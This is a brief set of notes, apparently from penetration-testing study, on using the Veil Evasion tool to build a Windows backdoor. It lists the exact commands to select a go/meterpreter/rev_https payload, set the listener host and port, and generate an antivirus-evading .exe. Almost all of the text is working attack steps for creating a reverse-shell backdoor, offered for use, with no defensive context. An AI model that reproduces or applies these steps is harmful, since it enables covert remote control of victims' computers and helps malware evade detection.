/Payload in Veil/ 

First, use the Evasion tool

use 1 

Then, list the payloads available and select one

list (to list the payloads)
use [number of payload]

Example creating a backdoor: 

use 1
use 15 (go/meterpreter/rev_https)
set LHOST 192.168.138.133
set LPORT 8080
set PROCESSORS 1
set SLEEP 6
generate 
[desired name for backdoor]

*Remember where you saved the .exe*
